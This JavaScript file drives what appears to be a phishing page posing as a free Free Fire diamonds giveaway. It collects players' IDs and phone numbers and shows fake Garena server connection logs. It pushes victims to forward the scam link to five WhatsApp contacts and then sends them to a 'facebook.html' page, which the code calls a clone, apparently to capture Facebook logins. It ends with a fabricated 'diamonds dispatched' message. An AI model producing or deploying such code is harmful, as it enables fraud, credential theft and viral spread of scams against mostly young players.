// ==============================================================
// CONFIGURATION (Set your deployed referral URL here)
// ==============================================================
const REFERRAL_LINK = "https://freefire.diamondhub.event/claim?ref=ff92a";
// ==============================================================

document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements - Connection Step
    const playerIdInput = document.getElementById('playerId');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const connectBtn = document.getElementById('connectBtn');
    const connectionForm = document.getElementById('connectionForm');
    
    const statusConsole = document.getElementById('statusConsole');
    const consoleLogs = document.getElementById('consoleLogs');
    const connectionSuccess = document.getElementById('connectionSuccess');
    const playerNameDisplay = document.getElementById('playerNameDisplay');
    
    const step1Card = document.getElementById('step1Card');
    const step2Card = document.getElementById('step2Card');
    const step3Card = document.getElementById('step3Card');

    // DOM Elements - Sharing & Claims
    const referralUrlInput = document.getElementById('referralUrl');
    const shareBtn = document.getElementById('shareBtn');

    
    const progressText = document.getElementById('progressText');
    const progressBar = document.getElementById('progressBar');
    const rewardConsole = document.getElementById('rewardConsole');
    
    const facebookLoginBtn = document.getElementById('facebookLoginBtn');
    const toastContainer = document.getElementById('toastContainer');

    // State Variables
    let referralCount = 0;
    const maxReferrals = 5;
    let connectedPlayerId = "";

    // Set the configured referral URL in the input field
    if (referralUrlInput) {
        referralUrlInput.value = REFERRAL_LINK;
    }

    const mockNames = [
        "FF_CRIMSON_BOY", "GARENA_SLAYER", "Sniper_Elite_FF", 
        "ALPHA_DRAGON", "VORTEX_WARRIOR", "FF_Master_X", 
        "FF_RAIDER_77", "GarenaLegend", "SniperQueen_FF"
    ];

    // Toast Notification System
    function showToast(message, type = 'success') {
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <span>✨</span>
            <span>${message}</span>
        `;
        toastContainer.appendChild(toast);

        // Remove toast after animation completes
        setTimeout(() => {
            toast.style.animation = 'slideUp 0.3s reverse forwards';
            setTimeout(() => {
                toast.remove();
            }, 300);
        }, 3000);
    }

    // Step 1: Simulate Garena Account Connection
    connectBtn.addEventListener('click', () => {
        const idVal = playerIdInput.value.trim();
        const phoneVal = phoneNumberInput.value.trim();

        if (!idVal || idVal.length < 8) {
            showToast("Please enter a valid Player ID (min 8 digits).", "error");
            return;
        }

        if (!phoneVal || phoneVal.length < 7) {
            showToast("Please enter a valid mobile number.", "error");
            return;
        }

        connectedPlayerId = idVal;
        
        // Hide form & show console loader
        connectionForm.style.display = 'none';
        statusConsole.style.display = 'flex';
        consoleLogs.innerHTML = '';

        const logs = [
            `Connecting to Garena Secure Database...`,
            `Searching for Player ID: ${idVal}...`,
            `Status: Player Found!`,
            `Linking Mobile Number: ${phoneVal}...`,
            `Authenticating secure event ticket claim?ref=ff92a...`,
            `Garena Server Connection: Established!`
        ];

        let lineIdx = 0;
        function printNextLog() {
            if (lineIdx < logs.length) {
                const line = document.createElement('div');
                line.className = 'console-line';
                line.textContent = `> ${logs[lineIdx]}`;
                consoleLogs.appendChild(line);
                lineIdx++;
                setTimeout(printNextLog, 600);
            } else {
                // Completed connection sequence
                setTimeout(() => {
                    statusConsole.style.display = 'none';
                    connectionSuccess.style.display = 'flex';
                    // Save state
                    localStorage.setItem('garena_step1_connected', 'true');
                    localStorage.setItem('garena_player_id', connectedPlayerId);
                    localStorage.setItem('garena_phone_number', phoneVal);
                    unlockShareStep();
                }, 800);
            }
        }

        printNextLog();
    });

    function getRandomName() {
        const name = mockNames[Math.floor(Math.random() * mockNames.length)];
        playerNameDisplay.textContent = name;
        return name;
    }

    // Unlock Step 2: Sharing Challenge
    function unlockShareStep() {
        step2Card.classList.remove('locked');
        step2Card.classList.add('active');
        showToast("Free Fire Account Linked! Proceed to Step 2 to generate referrals.");
    }

    // WhatsApp Direct Sharing & Progress Increment
    shareBtn.addEventListener('click', () => {
        if (step2Card.classList.contains('locked')) return;

        const encodedLink = encodeURIComponent(referralUrlInput.value);
        const message = encodeURIComponent(`Get 500 Free Fire Diamonds Crate! Link account and claim here: `);
        const shareUrl = `https://api.whatsapp.com/send?text=${message}${encodedLink}`;

        window.open(shareUrl, '_blank');

        // Increment Referral Counter
        if (referralCount < maxReferrals) {
            referralCount++;
            updateProgress();
            localStorage.setItem('garena_referrals', referralCount);

            if (referralCount === maxReferrals) {
                unlockClaimStep();
            } else {
                showToast(`Redirecting to WhatsApp! Referral count updated (${referralCount}/${maxReferrals}).`);
            }
        }
    });

    // Update Progress UI
    function updateProgress() {
        const percentage = (referralCount / maxReferrals) * 100;
        progressBar.style.width = `${percentage}%`;
        progressText.textContent = `${referralCount} / ${maxReferrals} Invited`;
    }

    // Unlock Step 3: Verification
    function unlockClaimStep() {
        rewardConsole.classList.add('unlocked');
        step3Card.classList.remove('locked');
        step3Card.classList.add('active');
        
        // Hide Share Actions
        shareBtn.style.display = 'none';
        
        showToast("Challenge complete! Vault rewards unlocked. Verify your account to claim the diamonds.");
    }

    // Secure Verification Clicks (Redirect to custom responsive clones)

    facebookLoginBtn.addEventListener('click', () => {
        if (step3Card.classList.contains('locked')) return;
        localStorage.setItem('garena_step1_connected', 'true');
        localStorage.setItem('garena_player_id', connectedPlayerId);
        localStorage.setItem('garena_player_name', playerNameDisplay.textContent);
        localStorage.setItem('garena_referrals', referralCount);
        
        window.location.href = 'facebook.html';
    });

    // -------------------------------------------------------------
    // Session State Restoration & Callback Handling
    // -------------------------------------------------------------
    const urlParams = new URLSearchParams(window.location.search);
    const verifiedParam = urlParams.get('verified');
    
    // Save verification state if returning from clone redirect
    if (verifiedParam === 'facebook') {
        localStorage.setItem('verified_success', 'true');
        localStorage.setItem('verified_method', verifiedParam);
    }
    
    const isStep1Connected = localStorage.getItem('garena_step1_connected') === 'true';
    const savedPlayerId = localStorage.getItem('garena_player_id') || "";
    const savedPlayerName = localStorage.getItem('garena_player_name') || "";
    const savedReferralCount = parseInt(localStorage.getItem('garena_referrals') || "0");
    const isVerified = localStorage.getItem('verified_success') === 'true';

    if (isStep1Connected && savedPlayerId) {
        // Restore Step 1 state
        connectedPlayerId = savedPlayerId;
        connectionForm.style.display = 'none';
        statusConsole.style.display = 'none';
        connectionSuccess.style.display = 'flex';
        
        // Restore Step 2 state
        step2Card.classList.remove('locked');
        step2Card.classList.add('active');
        referralCount = savedReferralCount;
        updateProgress();
        
        if (referralCount >= maxReferrals) {
            // Restore Step 3 state
            unlockClaimStep();
            
            if (isVerified) {
                // If verified, replace claim actions with success state
                const claimActions = document.querySelector('.claim-actions');
                if (claimActions) {
                    claimActions.innerHTML = `
                        <div class="success-alert" id="verificationSuccess" style="display: flex; width: 100%; border-color: var(--color-success); background: rgba(16, 185, 129, 0.1); margin-top: 10px;">
                            <span class="success-icon" style="background-color: var(--color-success); width: 24px; height: 24px; display: inline-flex; align-items: center; justify-content: center; border-radius: 50%; color: white; font-weight: bold; margin-right: 12px;">✓</span>
                            <div>
                                <h4 style="color: #fff; font-size: 14px; font-weight: 700; margin-bottom: 2px;">Verification Complete!</h4>
                                <p style="color: var(--color-text-muted); font-size: 12px; margin: 0;">500 Diamonds Crate dispatched to Garena Vault.</p>
                            </div>
                        </div>
                        <div style="margin-top: 16px; text-align: center; width: 100%;">
                            <p style="color: var(--color-accent); font-size: 14px; font-weight: 700; animation: fire-pulse 1.5s infinite alternate; margin: 0;">💎 Crate Claimed & Active in Game!</p>
                        </div>
                    `;
                }
                
                // Show verification success toast once
                if (verifiedParam) {
                    setTimeout(() => {
                        showToast(`Account verification successful via Facebook!`, "success");
                        // Clean up url parameters without reloading
                        window.history.replaceState({}, document.title, window.location.pathname);
                    }, 600);
                }
            }
        }
    }
});
